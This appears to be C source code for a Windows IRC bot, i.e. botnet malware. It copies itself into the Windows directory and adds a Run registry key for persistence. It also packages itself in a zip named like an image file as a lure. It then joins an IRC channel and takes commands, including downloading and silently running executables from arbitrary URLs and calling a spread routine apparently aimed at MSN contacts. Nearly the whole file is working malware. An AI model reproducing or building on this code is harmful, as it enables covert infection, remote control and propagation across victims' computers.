#include "inc.h"
char channel[32]= "#channel";
char server[32]= "server";
int port = 1905;
char szFileName[] = "filename.exe";
char szRegName[] = "regname";
char szMutex[] = "mutex";
char szPicname[] = "img104385.jpeg-www.imageshack.com";
char szZipname[] = "\\img104385.zip";

int sleeptime = 12000;
SOCKET sock;
char user[50]= "TMR TMR TMR :TMR";
char msg[256];
 
char *addrr(const char *addr)
{
	struct hostent *he = NULL;
	char address[64];
 
	if (addr == NULL)
		strcpy(address, "");
	else
		strcpy(address, addr);
	he = gethostbyname(address);
	while(!he)Sleep(sleeptime);
	return inet_ntoa(*(struct in_addr *) he->h_addr_list[0]);
}
 
 
char *rndx(int size)
{
	int k;
	char *buf;
	unsigned int ret;
 
	buf = (char *)malloc(size + 1);
	memset(buf, '\0', size + 1);
	srand((unsigned int)time(NULL));
	for (k = 0; k < size; k++)
	{
		ret = ((rand() % 26) + 97);
		strcat(buf, (const char *)&ret);
	}
 
	return buf;
}
 
 
int getfile(char *link,char *exxe)
{
  FILE *fp;
  HINTERNET hOpen, hURL;
  char file[99];
  unsigned long read;
  PROCESS_INFORMATION pInfo;
   STARTUPINFO sInfo;
  memset(&sInfo, 0, sizeof(sInfo));
  memset(&pInfo, 0, sizeof(pInfo));
  sInfo.cb = sizeof(STARTUPINFO);
  sInfo.dwFlags = STARTF_USESHOWWINDOW;
  sInfo.wShowWindow = SW_HIDE;
  hOpen = InternetOpen("wget", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
  if (hOpen == NULL) 
	  return 0;
	else
  hURL = InternetOpenUrl( hOpen, link, NULL, 0, 0, 0 );
	  if (hURL == NULL) 
	  return 0;
	else
  fp = fopen(exxe, "wb");
	  if (fp!=NULL)
  {
  while(InternetReadFile(hURL, file, sizeof(file) - 1 , &read) && read != 0)
  {
     fwrite(file, sizeof(char), read, fp);
  }
  fclose(fp);
  CreateProcess(NULL, exxe, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
  return 1;
	  }
	  return 0;
}
 
void iparse(char *commands) 
{
	char *token[10];
	token[0] =strtok(commands," \r\n");
	for (int i=1;i<10;i++)
	{
		token[i]=strtok(NULL," \r\n");
	}
 
	if (strstr(token[3], "test"))
    {
		  msnspread();
    }
 
	if (strstr(token[3], "download"))
	{
		 char fileto[MAX_PATH];
	     char *url;
	     url = token[4];	
 
	     strcpy(fileto,rndx(6));
	     strcat(fileto,".exe");
 
	     if (getfile(url,fileto)) {
			 sprintf(msg, "PRIVMSG %s :Çalýþtýrýldý [%s]\n", channel, url);
	         send(sock, msg, strlen(msg), 0);
		 }
 
		 else
	 		 sprintf(msg, "PRIVMSG %s :Hata! [%s]\n", channel, url);
		     send(sock, msg, strlen(msg), 0);
	 }
}
 
BOOL FlushDNSCache(void)
{
 	DFRC fDnsFlushResolverCache;
    DFRCEA fDnsFlushResolverCacheEntry_A;
    HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");
		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A);
	}
 
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();
 
	return (bRet);
}
 
DWORD WINAPI ircmain(void*) 
{
	DWORD id = 0;
	HKEY hndKey = NULL;
	HANDLE MutexHandle;
	MutexHandle = CreateMutex(0, 0, szMutex);
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return(0);
	}
	struct sockaddr_in addr;
top:
	Sleep(5000);
	WSADATA WSAData;
	WSAStartup(MAKEWORD(1,0), &WSAData);
    char buffer[BUFSIZ];
	char *ptr;
    char msg[256],temp[10];
	addr.sin_addr.s_addr = inet_addr(addrr(server));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	//void InstallCode();

	while(connect(sock,(struct sockaddr*)&addr,sizeof(addr)))
	{
		FlushDNSCache();
		WSACleanup();
        closesocket(sock);
		goto top;
	}
 
	HANDLE hFile, FileHandle;
	hFile = CreateFile("new.txt",
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		sprintf (buffer, "NICK [N]%s\n", rndx(8));
		FileHandle = CreateFile("new.txt", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if(FileHandle != INVALID_HANDLE_VALUE)
           CloseHandle(FileHandle);
		CloseHandle(hFile);
	}  
	else sprintf (buffer, "NICK %s\n", rndx(8));
	send (sock, buffer, strlen (buffer), 0);
	sprintf (buffer, "USER %s\n", user);
	send (sock, buffer, strlen (buffer), 0);
	Sleep(500);
	sprintf (buffer, "JOIN #testing\n");
	send (sock, buffer, strlen (buffer), 0);
	
	while (1) {
 
   	    memset(buffer, '\0', BUFSIZ); 
 
		if (recv(sock, buffer, BUFSIZ-1, 0) <= 0) 
		{
 
			WSACleanup();
            closesocket(sock);
			goto top;
		} else { 


			if (strstr(buffer, "PING :"))
	        {
	            ptr = strstr(buffer, "PING :") + strlen("PING :");
	            sprintf(msg, "PONG :%s\n", ptr);
	            send(sock, msg, strlen(msg), 0);
	        }
			else if (strstr(buffer, "433"))
			{
			    sprintf (buffer, "NICK %s\n", rndx(8));
			    send(sock, msg, strlen(msg), 0);
	        }
 
			else if (strstr(buffer, "404"))
	        {
			    sprintf (msg, "JOIN #deneme2\n");
			    send(sock, msg, strlen(msg), 0);
	        }
 
			else if (strstr(buffer, "KICK"))
	        {
 
			    sprintf (msg, "JOIN #deneme2\n");
			    send(sock, msg, strlen(msg), 0);
	        }
 
			else if (strstr(buffer, ".test"))
			{
				msnspread();
			}
 
			else if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) 
			{
			    iparse(buffer);
			}
		}
	}
	WSACleanup();
    closesocket(sock);
 
    return TRUE;
}
 

void InstallCode()
{
	char windir[MAX_PATH] = {0}, cfilename[MAX_PATH] = {0}, tmpfilename[MAX_PATH] = {0};
	char buf3[260];
    int i = 0;
	DWORD id = 0;
	HKEY hndKey = NULL;

	GetWindowsDirectory(windir, sizeof(windir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	sprintf(tmpfilename, "%s\\%s", windir, szFileName);

	if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
	SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

	CopyFile(cfilename, tmpfilename, FALSE);
	SetFileAttributes(tmpfilename,/*FILE_ATTRIBUTE_HIDDEN | */FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	{
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
	RegSetValueEx(hndKey,szRegName,0, REG_SZ,(const unsigned char *)szFileName,strlen(szFileName));
	RegCloseKey(hndKey);

	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);

	strcat(windir,szZipname);
    zip_store(buf3,windir,szPicname);

	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	
	InstallCode();
	ircmain(NULL);

}
